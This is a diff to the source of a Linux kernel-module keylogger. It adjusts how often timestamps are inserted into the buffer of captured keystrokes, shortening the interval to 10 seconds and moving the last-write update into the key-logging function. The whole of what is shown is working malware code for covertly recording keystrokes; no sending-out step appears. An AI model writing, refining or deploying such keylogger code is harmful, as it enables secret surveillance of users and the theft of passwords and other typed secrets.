@@ -13,7 +13,7 @@ MODULE_LICENSE("GPL");
 #define BUF_SIZE (PAGE_SIZE << 2) // 2*2*PAGE_SIZE
 #define LINE_LIMIT 50; /*50 chars per line*/
 // Write_increment is in seconds
-#define WRITE_INCREMENT (1 * 30)
+#define WRITE_INCREMENT 10
 
 // Store current_time (rather than reallocating everytime)
 static struct timespec *our_current_time;
@@ -156,11 +156,14 @@ int log_keys(int keycode, int shift_mask)
 		key_buf.pos += key_length;
 
 	}
-	
-	// If time increment has passed write timelog to file
+
+	// If time increment has passed since last log_key write timelog to file
 	if (our_current_time->tv_sec - key_buf.last_write >= WRITE_INCREMENT) {
 		store_time_in_buffer(our_current_time);
 	}
+
+	key_buf.last_write = our_current_time->tv_sec;
+
 	return NOTIFY_OK;
 }
 
@@ -182,7 +185,6 @@ int keylogger_callback(struct notifier_block *nblock,
 /* Used to store current time into the buffer */
 void store_time_in_buffer(struct timespec * current_time){
 	size_t timestring_length;
-	key_buf.last_write = current_time->tv_sec;
 	memset(key_buf.time_string,0,strlen(key_buf.time_string));
 	sprintf(key_buf.time_string,"\r[TIME-LOG (time_t): %ld]\n",(key_buf.last_write));
 	
